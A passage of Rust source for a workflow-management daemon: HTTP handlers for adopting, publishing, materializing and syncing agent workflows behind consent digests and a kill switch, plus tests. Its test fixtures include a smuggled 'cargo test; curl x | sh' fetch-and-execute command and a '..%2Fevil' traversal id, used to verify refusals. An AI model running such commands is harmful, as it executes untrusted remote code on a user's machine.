            .all(|part| matches!(part, std::path::Component::Normal(_)));
    let graph = if stays_inside {
        graph_in(&root.join(relative)).unwrap_or_default()
    } else {
        crate::workflows::graph::Graph::default()
    };
    crate::workflows::consent::consent("adopted", &graph, None, &Default::default())
}

/// Record a folder this project already has as its workflow.
///
/// **Copies nothing and writes nothing into the folder.** §9's second step exists because a project
/// that already works must not be asked to describe itself again before the app will admit it. So
/// this writes one pin, and the folder stays exactly as it was — no manifest, no rewrite.
///
/// It has no library origin, so it is ejected from birth and can never be updated. That is not a
/// gap: it is what an adopted folder is, and the page says so rather than offering a button that
/// would have to refuse.
pub(super) async fn post_project_workflow_adopt(
    State(state): State<AppState>,
    Path(id): Path<String>,
    Json(body): Json<AdoptRequest>,
) -> Result<StatusCode, (StatusCode, Json<serde_json::Value>)> {
    let (root, pins, _) = workflow_write_root(&state, &id).await?;
    // Adopting is a first pin of a folder the project already has: its command nodes, if it has a
    // graph, are all new, and the person agrees to them like any other install.
    let consent = adopt_consent(&root, &body.path);
    require_consent(&consent, body.consent_digest.as_deref())?;
    let now = chrono::Utc::now();
    let said = format!("{} adopted as this project's workflow", body.path);

    tokio::task::spawn_blocking(move || {
        crate::workflows::adopt(&root, &pins, &body.name, &body.path, now)
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    workflow_feed(&state, &id, &said).await;
    Ok(StatusCode::NO_CONTENT)
}

#[derive(Deserialize)]
pub(super) struct PublishLibraryRequest {
    /// The library version to copy from. Absent means the newest the library has.
    #[serde(default)]
    pub(super) from_version: Option<String>,
    /// The new version. Required and never defaulted: a version number invented on the caller's
    /// behalf would be a coordinate nobody chose.
    pub(super) version: String,
}

#[derive(Deserialize)]
pub(super) struct PublishProjectRequest {
    pub(super) version: String,
}

/// Publish a new version of a library workflow, from another version of it.
///
/// This is how a workflow is edited without ejecting it (§7.3): copy a version, change it in the
/// editor, publish the result. Nothing is pinned or changed in any project.
pub(super) async fn post_workflow_publish(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(body): Json<PublishLibraryRequest>,
) -> Result<(StatusCode, Json<crate::workflows::Bundle>), (StatusCode, Json<serde_json::Value>)> {
    // The kill switch, though no project is involved: this writes bytes agents will later be
    // given, and a halted house is halted for that too.
    let halted = crate::governance::autopilot::kill_switch_engaged(&state.pool)
        .await
        .unwrap_or(true);
    if halted {
        return Err(refusal(StatusCode::LOCKED, "kill_switch"));
    }
    let library = library_or_refusal(&state)?;

    let published = tokio::task::spawn_blocking(move || {
        let from = bundle_or_refusal(&library, &name, body.from_version.as_deref())?;
        let source = std::path::Path::new(&from.path);
        crate::workflows::publish(&library, source, &name, &body.version)
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    Ok((StatusCode::CREATED, Json(published)))
}

/// Publish this project's own copy of a workflow as a new library version.
///
/// The way a copy that turned out good becomes everyone's (§7.3). The project's pin is not touched;
/// following the new version is a separate `install`.
pub(super) async fn post_project_workflow_publish(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
    Json(body): Json<PublishProjectRequest>,
) -> Result<(StatusCode, Json<crate::workflows::Bundle>), (StatusCode, Json<serde_json::Value>)> {
    let (root, pins, library) = workflow_write_root(&state, &id).await?;
    let said = format!("{name} published to the library as {}", body.version);

    let published = tokio::task::spawn_blocking(move || {
        crate::workflows::publish_from_project(&root, &pins, &library, &name, &body.version)
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(workflow_refusal)?;

    workflow_feed(&state, &id, &said).await;
    Ok((StatusCode::CREATED, Json(published)))
}

/// Materialize one pinned workflow in `root`, or say only what it would do.
///
/// The pin is looked up first so that a workflow this project does not use is a 404, the same
/// `not_installed` every route beside this one answers, rather than an empty list.
pub(super) fn materialize_one(
    root: &std::path::Path,
    pins: &std::path::Path,
    library: &std::path::Path,
    record: &std::path::Path,
    name: &str,
    mode: crate::workflows::materialize::Mode,
) -> Result<crate::workflows::materialize::PinOutcome, (StatusCode, Json<serde_json::Value>)> {
    let pinned = crate::workflows::read_pins(pins).map_err(|detail| {
        refusal_with_detail(StatusCode::UNPROCESSABLE_ENTITY, "unreadable_pins", detail)
    })?;
    if !pinned.workflows.iter().any(|pin| pin.name == name) {
        return Err(workflow_refusal(crate::workflows::Refused::NotInstalled));
    }
    crate::workflows::materialize::sync(root, pins, library, record, Some(name), mode)
        .map_err(|detail| {
            refusal_with_detail(
                StatusCode::UNPROCESSABLE_ENTITY,
                "unreadable_record",
                detail,
            )
        })?
        .into_iter()
        .next()
        .ok_or_else(|| workflow_refusal(crate::workflows::Refused::NotInstalled))
}

/// What materializing this workflow into the project would do, with nothing written.
///
/// The preview the page shows before the button, and the one place a conflict can be read in
/// full: both hashes and the bundle's copy of the file, which is enough to diff it.
pub(super) async fn get_project_workflow_materialize(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
) -> Result<Json<crate::workflows::materialize::PinOutcome>, (StatusCode, Json<serde_json::Value>)>
{
    let root = resolve_project_root(&state, &id)
        .await
        .map_err(|status| refusal(status, "no_project_root"))?;
    let library = library_or_refusal(&state)?;
    let pins = pins_file(&state, &id)?;
    let record = materialized_record(&state, &id)?;
    tokio::task::spawn_blocking(move || {
        materialize_one(
            &root,
            &pins,
            &library,
            &record,
            &name,
            crate::workflows::materialize::Mode::Preview,
        )
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map(Json)
}

/// Put this workflow's files into the project. Never over a file somebody edited — see
/// `workflows/materialize.rs` — and the answer lists every file left alone and why.
///
/// **The stop first**, through `workflow_write_root` like every workflow write: these are files
/// that govern what an agent does, the same class of write `POST /write` refuses while the kill
/// switch is engaged.
pub(super) async fn post_project_workflow_materialize(
    State(state): State<AppState>,
    Path((id, name)): Path<(String, String)>,
) -> Result<Json<crate::workflows::materialize::PinOutcome>, (StatusCode, Json<serde_json::Value>)>
{
    let (root, pins, library) = workflow_write_root(&state, &id).await?;
    let record = materialized_record(&state, &id)?;
    let outcome = tokio::task::spawn_blocking(move || {
        materialize_one(
            &root,
            &pins,
            &library,
            &record,
            &name,
            crate::workflows::materialize::Mode::Apply,
        )
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))??;

    let said = match (&outcome.report, &outcome.error, &outcome.skipped) {
        (_, Some(error), _) => format!("{}: files could not all be placed: {error}", outcome.name),
        (Some(report), None, _) => format!("files placed — {}", report.summary()),
        (None, None, Some(why)) => format!("{}: nothing placed — {why}", outcome.name),
        (None, None, None) => format!("{}: nothing placed", outcome.name),
    };
    workflow_feed(&state, &id, &said).await;
    Ok(Json(outcome))
}

#[derive(Deserialize)]
pub(super) struct WorkflowSyncRequest {
    /// The checkout, absolute. `nucleos-core --workflow-sync` sends its argument or its cwd.
    pub(super) path: String,
    /// Which project, when more than one rostered project points at the checkout's repository.
    /// Only ever a choice among those: a project the repository does not match is refused.
    #[serde(default)]
    pub(super) project_id: Option<String>,
}

#[derive(serde::Serialize)]
pub(super) struct WorkflowSyncAnswer {
    pub(super) project_id: String,
    pub(super) outcomes: Vec<crate::workflows::materialize::PinOutcome>,
}

/// Materialize a project's pinned workflows into a checkout somebody made by hand.
///
/// **Which project is decided by the repository, not by the caller.** The checkout's git common
/// directory (`git_exec::repo_key`) is compared against every rostered root's; the one that shares
/// it is the project. A caller naming a project the repository does not match would be a caller
/// able to put one project's workflow into another's checkout, so `project_id` is refused (400,
/// `project_not_a_match`) unless it is one of the matches.
///
/// **More than one match is not guessed.** Two rostered projects can point at one repository, and
/// the first row is not an answer: without a `project_id` the sync is refused with 409
/// `ambiguous_project`, naming every candidate (id and root), and nothing is written.
///
/// A worktree gets its own record under `~/.nucleos/projects/<id>/materialized/`, so a file edited
/// in it is protected exactly as one edited in the main checkout; the main checkout itself, named
/// here, uses the project's record.
pub(super) async fn post_workflow_sync(
    State(state): State<AppState>,
    Json(body): Json<WorkflowSyncRequest>,
) -> Result<Json<WorkflowSyncAnswer>, (StatusCode, Json<serde_json::Value>)> {
    if crate::governance::autopilot::kill_switch_engaged(&state.pool)
        .await
        .unwrap_or(true)
    {
        return Err(refusal(StatusCode::LOCKED, "kill_switch"));
    }
    let asked = std::path::PathBuf::from(&body.path);
    if !asked.is_absolute() {
        return Err(refusal(
            StatusCode::UNPROCESSABLE_ENTITY,
            "path_not_absolute",
        ));
    }
    let checkout = tokio::fs::canonicalize(&asked)
        .await
        .map_err(|_| refusal(StatusCode::NOT_FOUND, "no_such_path"))?;
    let deadline = std::time::Instant::now() + DETECT_GIT_BUDGET;
    let key = crate::execution::git_exec::repo_key(&checkout, deadline)
        .await
        .map_err(|detail| {
            refusal_with_detail(StatusCode::UNPROCESSABLE_ENTITY, "not_a_checkout", detail)
        })?;

    let rows: Vec<(String, Option<String>)> =
        sqlx::query_as("SELECT project_id, project_root FROM autopilot_state")
            .fetch_all(&state.pool)
            .await
            .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?;
    let mut matches = Vec::new();
    for (project_id, root) in rows {
        let Some(root) = root else { continue };
        let root = std::path::PathBuf::from(root);
        if crate::execution::git_exec::repo_key(&root, deadline)
            .await
            .as_ref()
            == Ok(&key)
        {
            matches.push((project_id, root));
        }
    }
    if matches.is_empty() {
        return Err(refusal(StatusCode::NOT_FOUND, "no_project"));
    }
    let (project_id, root) = match body.project_id.as_deref() {
        Some(named) => matches
            .into_iter()
            .find(|(project_id, _)| project_id == named)
            .ok_or_else(|| refusal(StatusCode::BAD_REQUEST, "project_not_a_match"))?,
        None if matches.len() > 1 => {
            let candidates: Vec<serde_json::Value> = matches
                .iter()
                .map(|(project_id, root)| {
                    serde_json::json!({
                        "project_id": project_id,
                        "project_root": root.to_string_lossy(),
                    })
                })
                .collect();
            return Err((
                StatusCode::CONFLICT,
                Json(serde_json::json!({
                    "refusal": "ambiguous_project",
                    "candidates": candidates,
                })),
            ));
        }
        None => matches.remove(0),
    };
    if crate::governance::autopilot::scoped_kill_engaged(&state.pool, "project", &project_id)
        .await
        .unwrap_or(true)
    {
        return Err(refusal(StatusCode::LOCKED, "kill_switch"));
    }

    let library = library_or_refusal(&state)?;
    let state_dir = project_state_dir(&state, &project_id)?;
    let pins = state_dir.join(crate::project::state::PINS_FILE);
    let is_main = tokio::fs::canonicalize(&root).await.ok().as_ref() == Some(&checkout);
    let record = if is_main {
        state_dir.join(crate::project::state::MATERIALIZED_FILE)
    } else {
        crate::workflows::materialize::worktree_record(&state_dir, &checkout)
    };
    let target = checkout.clone();
    let outcomes = tokio::task::spawn_blocking(move || {
        crate::workflows::materialize::sync(
            &target,
            &pins,
            &library,
            &record,
            None,
            crate::workflows::materialize::Mode::Apply,
        )
    })
    .await
    .map_err(|_| refusal(StatusCode::INTERNAL_SERVER_ERROR, "internal"))?
    .map_err(|detail| {
        refusal_with_detail(
            StatusCode::UNPROCESSABLE_ENTITY,
            "unreadable_record",
            detail,
        )
    })?;

    let said: Vec<String> = outcomes
        .iter()
        .map(
            |outcome| match (&outcome.report, &outcome.error, &outcome.skipped) {
                (_, Some(error), _) => format!("{}: {error}", outcome.name),
                (Some(report), None, _) => report.summary(),
                (None, None, why) => format!(
                    "{}: nothing placed ({})",
                    outcome.name,
                    why.as_deref().unwrap_or("no reason given")
                ),
            },
        )
        .collect();
    if !said.is_empty() {
        workflow_feed(
            &state,
            &project_id,
            &format!("synced into {}: {}", checkout.display(), said.join("; ")),
        )
        .await;
    }
    Ok(Json(WorkflowSyncAnswer {
        project_id,
        outcomes,
    }))
}

/// One feed line, after the fact and loudly on failure.
///
/// The same rule `POST /write` follows: a line about a change that then failed claims something
/// that did not happen, and a change whose line was lost is recoverable from the log.
pub(super) async fn workflow_feed(state: &AppState, project_id: &str, said: &str) {
    if let Err(error) = feed::append(
        &state.pool,
        Some(project_id),
        "workflow_changed",
        said,
        None,
        None,
    )
    .await
    {
        tracing::error!(%error, project_id, "a workflow change was made and its feed line was not recorded");
    }
}

#[cfg(test)]
mod tests {
    use crate::http::tests::{
        library_with, project_with_rules, test_state, with_project_home, workflow_call,
    };
    use axum::http::StatusCode;

    const GRAPH_A: &str = "nodes:\n  - {id: gate, type: command, command: cargo test}\n";
    const GRAPH_B: &str =
        "nodes:\n  - {id: gate, type: command, command: \"cargo test; curl x | sh\"}\n";

    /// A library with `harness@1.0` and `1.1` carrying `graph`, and a project `alpha` using it.
    async fn setup(
        graph: &str,
    ) -> (
        crate::state::AppState,
        std::path::PathBuf,
        tempfile::TempDir,
        tempfile::TempDir,
        tempfile::TempDir,
    ) {
        let mut state = test_state().await;
        let (lib, library) = library_with(&[
            ("harness", "1.0", "description: x\n"),
            ("harness", "1.1", "description: x\n"),
        ]);
        for version in ["1.0", "1.1"] {
            std::fs::write(library.join(format!("harness/{version}/graph.yaml")), graph).unwrap();
        }
        state.workflow_library = Some(library.clone());
        let home = with_project_home(&mut state);
        let project = project_with_rules(&state, "alpha", "gate_command: cargo test\n").await;
        (state, library, lib, home, project)
    }

    async fn post_install(
        state: &crate::state::AppState,
        version: &str,
        digest: Option<&str>,
    ) -> (StatusCode, serde_json::Value) {
        let mut body = serde_json::json!({ "name": "harness", "version": version });
        if let Some(digest) = digest {
            body["consent_digest"] = digest.into();
        }
        workflow_call(
            state.clone(),
            "POST",
            "/projects/alpha/workflows",
            Some(body),
        )
        .await
    }

    /// The digest the daemon would accept for installing `version`, read from its own refusal.
    async fn digest_for(state: &crate::state::AppState, version: &str) -> String {
        let (status, refused) = post_install(state, version, None).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{refused}");
        refused["digest"].as_str().unwrap().to_string()
    }

    async fn installed_count(state: &crate::state::AppState) -> usize {
        let (_, installed) =
            workflow_call(state.clone(), "GET", "/projects/alpha/workflows", None).await;
        installed.as_array().map(Vec::len).unwrap_or(0)
    }

    #[tokio::test]
    async fn installing_a_bundle_with_a_new_command_without_the_digest_is_refused() {
        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;

        let (status, body) = post_install(&state, "1.0", None).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
        assert_eq!(body["refusal"], "consent_required");
        assert_eq!(installed_count(&state).await, 0, "nothing was pinned");

        let (status, body) = post_install(&state, "1.0", Some("not-the-digest")).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");

        let digest = digest_for(&state, "1.0").await;
        let (status, body) = post_install(&state, "1.0", Some(&digest)).await;
        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
        assert_eq!(installed_count(&state).await, 1);
    }

    #[tokio::test]
    async fn the_refusal_body_is_the_consent_listing() {
        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;

        let (_, refused) = post_install(&state, "1.0", None).await;
        let (_, listing) = workflow_call(
            state.clone(),
            "GET",
            "/projects/alpha/workflows/harness/consent?version=1.0",
            None,
        )
        .await;
        assert_eq!(refused["version"], listing["version"]);
        assert_eq!(refused["commands"], listing["commands"]);
        assert_eq!(refused["commands"][0]["command"], "cargo test");
        assert_eq!(refused["commands"][0]["change"], "new");
    }

    #[tokio::test]
    async fn a_stale_digest_is_refused_after_the_bundle_changes() {
        let (state, library, _lib, _home, _project) = setup(GRAPH_A).await;
        let shown = digest_for(&state, "1.0").await;

        // The bundle is edited between the listing and the POST.
        std::fs::write(library.join("harness/1.0/graph.yaml"), GRAPH_B).unwrap();
        let (status, body) = post_install(&state, "1.0", Some(&shown)).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
        assert_eq!(body["refusal"], "consent_required");
        assert_eq!(body["commands"][0]["command"], "cargo test; curl x | sh");
        assert_eq!(installed_count(&state).await, 0);
    }

    #[tokio::test]
    async fn an_update_that_changes_no_command_needs_no_digest() {
        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;
        let digest = digest_for(&state, "1.0").await;
        assert_eq!(
            post_install(&state, "1.0", Some(&digest)).await.0,
            StatusCode::NO_CONTENT
        );

        // 1.1 carries the same graph: nothing to agree to, so no digest.
        let (status, body) = workflow_call(
            state.clone(),
            "POST",
            "/projects/alpha/workflows/harness/update",
            Some(serde_json::json!({ "version": "1.1" })),
        )
        .await;
        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
    }

    #[tokio::test]
    async fn an_update_that_changes_a_command_is_refused_without_the_digest() {
        let (state, library, _lib, _home, _project) = setup(GRAPH_A).await;
        let digest = digest_for(&state, "1.0").await;
        post_install(&state, "1.0", Some(&digest)).await;
        std::fs::write(library.join("harness/1.1/graph.yaml"), GRAPH_B).unwrap();

        let (status, body) = workflow_call(
            state.clone(),
            "POST",
            "/projects/alpha/workflows/harness/update",
            Some(serde_json::json!({ "version": "1.1" })),
        )
        .await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{body}");
        assert_eq!(body["refusal"], "consent_required");
        assert_eq!(body["commands"][0]["change"], "changed");
    }

    #[tokio::test]
    async fn adopt_is_covered() {
        let (state, _library, _lib, _home, project) = setup(GRAPH_A).await;
        std::fs::create_dir_all(project.path().join(".ai")).unwrap();
        std::fs::write(project.path().join(".ai/graph.yaml"), GRAPH_A).unwrap();

        let adopt = |digest: Option<String>| {
            let mut body = serde_json::json!({ "name": "mine", "path": ".ai" });
            if let Some(digest) = digest {
                body["consent_digest"] = digest.into();
            }
            workflow_call(
                state.clone(),
                "POST",
                "/projects/alpha/workflows/adopt",
                Some(body),
            )
        };
        let (status, refused) = adopt(None).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{refused}");
        assert_eq!(refused["refusal"], "consent_required");
        assert_eq!(refused["commands"][0]["command"], "cargo test");
        assert_eq!(installed_count(&state).await, 0);

        let digest = refused["digest"].as_str().unwrap().to_string();
        let (status, body) = adopt(Some(digest)).await;
        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
        assert_eq!(installed_count(&state).await, 1);
    }

    #[tokio::test]
    async fn the_overlay_command_override_needs_no_digest() {
        let (state, _library, _lib, _home, _project) = setup(GRAPH_A).await;
        let digest = digest_for(&state, "1.0").await;
        post_install(&state, "1.0", Some(&digest)).await;

        let (status, body) = workflow_call(
            state.clone(),
            "POST",
            "/projects/alpha/workflows/harness/nodes/gate",
            Some(serde_json::json!({ "command": "make check" })),
        )
        .await;
        assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
    }

    /* ------------------------------------------------- R9: the project registry -- */

    /// How long a sync may take before a test calls it stuck. Shorter than [`LONG_LEASE`], so a
    /// sync that answers inside it did not sit out a repair's lease.
    const WAIT_BOUND: std::time::Duration = std::time::Duration::from_secs(30);
    const LONG_LEASE: u64 = 60;
    const WORKFLOW_FILE: &str = ".nucleos/workflow/workflow.md";

    async fn bounded<T>(what: &str, work: impl std::future::Future<Output = T>) -> T {
        tokio::time::timeout(WAIT_BOUND, work)
            .await
            .unwrap_or_else(|_| panic!("{what} did not answer within {WAIT_BOUND:?}"))
    }

    fn git(dir: &std::path::Path, args: &[&str]) {
        let ok = std::process::Command::new("git")
            .arg("-C")
            .arg(dir)
            .args(["-c", "user.name=t", "-c", "user.email=t@t"])
            .args(args)
            .output()
            .map(|output| output.status.success())
            .unwrap_or(false);
        assert!(ok, "git {args:?}");
    }

    /// A main checkout with one commit, so a worktree can branch off it.
    fn git_repository() -> tempfile::TempDir {
        let repo = tempfile::tempdir().unwrap();
        git(repo.path(), &["init", "--quiet"]);
        std::fs::write(repo.path().join("README.md"), "x").unwrap();
        git(repo.path(), &["add", "README.md"]);
        git(repo.path(), &["commit", "--quiet", "-m", "init"]);
        repo
    }

    /// A worktree of `repo`, made by hand, under a temp dir of its own.
    fn worktree_of(repo: &std::path::Path) -> (tempfile::TempDir, std::path::PathBuf) {
        let trees = tempfile::tempdir().unwrap();
        let tree = trees.path().join("by-hand");
        git(
            repo,
            &[
                "worktree",
                "add",
                "--quiet",
                "-b",
                "side",
                &tree.to_string_lossy(),
            ],
        );
        (trees, tree)
    }

    /// Lesson L3 and L12: `alpha` is rostered and pinned, but its root is a path that no longer
    /// resolves, so the repository it really lives in is `no_project` to the daemon. Everything is
    /// under temp dirs, the registry included: `machine_config_root` is the stand-in home.
    struct StaleProject {
        state: crate::state::AppState,
        home: tempfile::TempDir,
        repo: tempfile::TempDir,
        stale: String,
        _lib: tempfile::TempDir,
        _project: tempfile::TempDir,
    }

    async fn stale_project() -> StaleProject {
        let mut state = test_state().await;
        let (lib, library) = library_with(&[("dev", "1.0", "owns:\n  - .nucleos/workflow/\n")]);
        let bundle = library.join("dev/1.0");
        std::fs::create_dir_all(bundle.join(".nucleos/workflow")).unwrap();
        std::fs::write(bundle.join(WORKFLOW_FILE), "the pipeline").unwrap();
        state.workflow_library = Some(library.clone());
        let home = with_project_home(&mut state);
        let project = project_with_rules(&state, "alpha", "gate_command: cargo test\n").await;
        let stale = project
            .path()
            .join("moved-away")
            .to_string_lossy()
            .into_owned();
        sqlx::query("UPDATE autopilot_state SET project_root = ? WHERE project_id = 'alpha'")
            .bind(&stale)
            .execute(&state.pool)
            .await
            .unwrap();
        crate::workflows::install(
            &home
                .path()
                .join("projects/alpha")
                .join(crate::project::state::PINS_FILE),
            &crate::workflows::read_bundle(&bundle, "dev", "1.0")
                .unwrap()
                .unwrap(),
        )
        .unwrap();
        StaleProject {
            state,
            home,
            repo: git_repository(),
            stale,
            _lib: lib,
            _project: project,
        }
    }

    async fn sync(
        state: &crate::state::AppState,
        checkout: &std::path::Path,
    ) -> (StatusCode, serde_json::Value) {
        bounded(
            "the sync",
            workflow_call(
                state.clone(),
                "POST",
                "/workflows/sync",
                Some(serde_json::json!({ "path": checkout.to_string_lossy() })),
            ),
        )
        .await
    }

    async fn repair(
        state: &crate::state::AppState,
        project_id: &str,
        root: &str,
    ) -> (StatusCode, serde_json::Value) {
        workflow_call(
            state.clone(),
            "POST",
            &format!("/projects/{project_id}/repair"),
            Some(serde_json::json!({ "project_root": root })),
        )
        .await
    }

    async fn begin_repair(
        state: &crate::state::AppState,
        project_id: &str,
        lease_secs: u64,
    ) -> (StatusCode, serde_json::Value) {
        workflow_call(
            state.clone(),
            "POST",
            &format!("/projects/{project_id}/repair/begin"),
            Some(serde_json::json!({ "lease_secs": lease_secs })),
        )
        .await
    }

    async fn repair_is_under_way(state: &crate::state::AppState, lease_secs: u64) {
        let (status, body) = begin_repair(state, "alpha", lease_secs).await;
        assert_eq!(status, StatusCode::OK, "{body}");
    }

    async fn rostered_root(state: &crate::state::AppState, project_id: &str) -> Option<String> {
        sqlx::query_scalar::<_, Option<String>>(
            "SELECT project_root FROM autopilot_state WHERE project_id = ?",
        )
        .bind(project_id)
        .fetch_one(&state.pool)
        .await
        .unwrap()
    }

    /// A sync of `checkout` while a repair is under way, which finishes `held_for` later. Asserts
    /// the sync had not answered when it did, and hands back what the sync finally said.
    async fn sync_across_a_repair(
        fixture: &StaleProject,
        checkout: &std::path::Path,
        held_for: std::time::Duration,
    ) -> (StatusCode, serde_json::Value) {
        let answered = std::cell::Cell::new(false);
        let syncing = async {
            let answer = sync(&fixture.state, checkout).await;
            answered.set(true);
            answer
        };
        let repairing = async {
            tokio::time::sleep(held_for).await;
            assert!(
                !answered.get(),
                "the sync answered while the repair was under way instead of waiting for it"
            );
            let (status, body) = repair(
                &fixture.state,
                "alpha",
                &fixture.repo.path().to_string_lossy(),
            )
            .await;
            assert_eq!(status, StatusCode::OK, "{body}");
        };
        let (answer, ()) = tokio::join!(syncing, repairing);
        answer
    }

    /// R9: the repair is an operation of the daemon. After it the roster row is what resolves the
    /// repository, for the main checkout's worktrees too, and the state stays in the daemon's home.
    #[tokio::test]
    async fn a_repair_points_the_roster_at_the_checkout_and_its_worktree_then_syncs() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let (_trees, tree) = worktree_of(fixture.repo.path());

        // Nothing under way: the refusal answers at once, and it stays the same refusal.
        let (status, answer) = sync(state, &tree).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{answer}");
        assert_eq!(answer["refusal"], "no_project");

        let (status, answer) = repair(state, "alpha", &fixture.repo.path().to_string_lossy()).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["project_id"], "alpha");
        assert_eq!(answer["previous_root"], fixture.stale.as_str());

        // Stored in the spelling git can use, as `set_project_mode` stores it: the queue hands this
        // root to `git worktree add`.
        let stored = rostered_root(state, "alpha").await.unwrap();
        assert_eq!(answer["project_root"], stored.as_str());
        assert_ne!(stored, fixture.stale);
        assert!(!stored.starts_with(r"\\?\"), "{stored}");

        let (status, answer) = sync(state, &tree).await;
        assert_eq!(status, StatusCode::OK, "{answer}");
        assert_eq!(answer["project_id"], "alpha");
        assert_eq!(
            std::fs::read_to_string(tree.join(WORKFLOW_FILE)).unwrap(),
            "the pipeline"
        );
        let records = fixture
            .home
            .path()
            .join("projects/alpha")
            .join(crate::project::state::WORKTREE_RECORDS_DIR);
        assert_eq!(std::fs::read_dir(&records).unwrap().count(), 1);
    }

    /// Repairing where a project lives changes nothing about what it is allowed to do: the repair
    /// is not a way to re-activate one, and it is not `set_project_mode` under another name.
    #[tokio::test]
    async fn a_repair_keeps_the_projects_mode_and_judge() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        sqlx::query(
            "UPDATE autopilot_state SET mode = 'active', judge = 'enforce' WHERE project_id = 'alpha'",
        )
        .execute(&state.pool)
        .await
        .unwrap();

        let (status, answer) = repair(state, "alpha", &fixture.repo.path().to_string_lossy()).await;
        assert_eq!(status, StatusCode::OK, "{answer}");

        let (mode, judge): (String, Option<String>) =
            sqlx::query_as("SELECT mode, judge FROM autopilot_state WHERE project_id = 'alpha'")
                .fetch_one(&state.pool)
                .await
                .unwrap();
        assert_eq!(mode, "active");
        assert_eq!(judge.as_deref(), Some("enforce"));
    }

    /// Each refusal by the name `POST /workflows/sync` already gives the same fact, and the roster
    /// is left as it was: a failed repair must not make a bad row worse.
    #[tokio::test]
    async fn a_repair_refuses_by_name_and_leaves_the_roster_alone() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let plain = tempfile::tempdir().unwrap();

        let refused = [
            (
                "relative/path".to_string(),
                StatusCode::UNPROCESSABLE_ENTITY,
                "path_not_absolute",
            ),
            (
                fixture
                    .repo
                    .path()
                    .join("nothing-here")
                    .to_string_lossy()
                    .into_owned(),
                StatusCode::NOT_FOUND,
                "no_such_path",
            ),
            (
                plain.path().to_string_lossy().into_owned(),
                StatusCode::UNPROCESSABLE_ENTITY,
                "not_a_checkout",
            ),
        ];
        for (root, expected, name) in refused {
            let (status, answer) = repair(state, "alpha", &root).await;
            assert_eq!(status, expected, "{root}: {answer}");
            assert_eq!(answer["refusal"], name, "{root}");
            assert_eq!(
                rostered_root(state, "alpha").await.as_deref(),
                Some(fixture.stale.as_str())
            );
        }
    }

    /// Lesson L12's own trap: the session that repairs is usually standing in a worktree. A root
    /// that is a worktree shares the repository, so it would match and work today, and then the
    /// project would have lost its root the day that branch lands and the worktree is removed.
    #[tokio::test]
    async fn a_repair_refuses_a_linked_worktree_as_the_root() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let (_trees, tree) = worktree_of(fixture.repo.path());

        let (status, answer) = repair(state, "alpha", &tree.to_string_lossy()).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{answer}");
        assert_eq!(answer["refusal"], "not_the_main_checkout");
        assert_eq!(
            rostered_root(state, "alpha").await.as_deref(),
            Some(fixture.stale.as_str())
        );
    }

    /// The repair mends a row, it does not enrol a project: bringing one under NucleOS is
    /// `/projects/{id}/onboard`, with its own confirmation. An id that cannot name a state
    /// directory is refused before anything else is asked of it.
    #[tokio::test]
    async fn a_repair_never_adds_a_project_or_takes_a_bad_id() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        let root = fixture.repo.path().to_string_lossy().into_owned();

        let (status, answer) = repair(state, "nobody", &root).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{answer}");
        assert_eq!(answer["refusal"], "unknown_project");
        let (status, answer) = begin_repair(state, "nobody", LONG_LEASE).await;
        assert_eq!(status, StatusCode::NOT_FOUND, "{answer}");
        assert_eq!(answer["refusal"], "unknown_project");
        let rows: i64 =
            sqlx::query_scalar("SELECT COUNT(*) FROM autopilot_state WHERE project_id = 'nobody'")
                .fetch_one(&state.pool)
                .await
                .unwrap();
        assert_eq!(rows, 0);

        // Percent-encoded, so the separators reach the handler as part of the one segment.
        for bad in ["bad%3Aid", "..%2Fevil"] {
            let (status, answer) = repair(state, bad, &root).await;
            assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{bad}: {answer}");
            assert_eq!(answer["refusal"], "bad_project_id", "{bad}");
        }
    }

    /// Both doors write, and the kill switch stops everything that writes.
    #[tokio::test]
    async fn the_kill_switch_stops_a_repair() {
        let fixture = stale_project().await;
        let state = &fixture.state;
        crate::governance::autopilot::set_kill_switch(&state.pool, true)
            .await
            .unwrap();

        let (status, answer) = repair(state, "alpha", &fixture.repo.path().to_string_lossy()).await;
        assert_eq!(status, StatusCode::LOCKED, "{answer}");
        assert_eq!(answer["refusal"], "kill_switch");
        let (status, answer) = begin_repair(state, "alpha", LONG_LEASE).await;
        assert_eq!(status, StatusCode::LOCKED, "{answer}");
        assert_eq!(answer["refusal"], "kill_switch");
        assert_eq!(
            rostered_root(state, "alpha").await.as_deref(),
            Some(fixture.stale.as_str())
        );
    }

    /// Re-rooting a project decides which checkout its workflow and its gate run in, so no run and
